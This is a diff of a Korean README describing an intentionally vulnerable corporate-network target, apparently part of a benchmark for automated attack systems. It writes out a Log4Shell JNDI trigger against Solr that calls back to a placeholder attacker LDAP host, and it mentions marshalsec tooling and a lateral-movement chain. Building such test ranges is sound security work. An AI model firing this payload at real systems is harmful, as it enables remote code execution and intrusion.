@@ -1,4 +1,4 @@
-# 취약 사내망 섬 (corp)
+# 취약 사내망 서버 (corp)
 
 방향 B 통합 타깃 — 취약점을 심지 않고 **알려진 취약점을 가진 구버전 서비스들로만** 구성한
 단일 사내망. 공격 시스템이 "여러 대상에 두루 통하는지"(일반화)를 재는 테스트셋의 한 축(깊이).
@@ -87,8 +87,8 @@
 ## Log4Shell 콜백 — 환경이 제공하지 않는다
 
 악성 클래스를 서빙하는 LDAP·HTTP 서버는 **공격자가 제어**해야 재현이 성립한다.
-인터넷 없는 섬에서는 공격 하네스가 `corp-ext` 발판에서 marshalsec / Java-Chains LDAP+HTTP를
-띄워 섬 내부로 콜백한다. 트리거: `GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}`.
+인터넷 없는 서버에서는 공격 하네스가 `corp-ext` 발판에서 marshalsec / Java-Chains LDAP+HTTP를
+띄워 서버 내부로 콜백한다. 트리거: `GET /solr/admin/cores?action=${jndi:ldap://<발판>:1389/x}`.
 
 ## 측면이동 체인 (통과 ② → 크라운)
 
